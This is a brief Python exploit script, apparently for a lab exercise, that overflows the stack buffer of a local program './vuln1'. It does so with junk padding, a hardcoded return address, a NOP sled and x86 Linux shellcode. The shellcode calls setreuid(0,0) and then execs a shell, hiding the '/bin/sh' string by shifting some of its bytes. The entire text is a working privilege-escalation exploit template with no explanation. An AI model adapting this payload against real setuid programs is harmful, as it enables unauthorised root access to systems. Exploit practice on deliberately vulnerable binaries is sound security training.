import struct
import subprocess

ret ="\xac\xfb\xff\xbf" #0xbffffbac
sc = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"\
	      "\x22\x5b\x31\xc0\x88\x43\x07\x80\x43\x02\x14\x80\x43\x03\x14\x80\x43\x06\x14\x89\x5b\x08\x89"\
	      "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"\
	      "\x80\xe8\xd9\xff\xff\xff\x2f\x62\x55\x5a\x2f"\
	      "\x73\x54\x4e\x41\x41\x41\x41\x42\x42\x42\x42"; 

# JUNK + RET + NOP + SC

buf = "A"*264                  # Junk
buf += ret  # return address
buf += "\x90"*100              # NOPs
buf += sc                      # Shellcode

subprocess.call(["./vuln1", buf])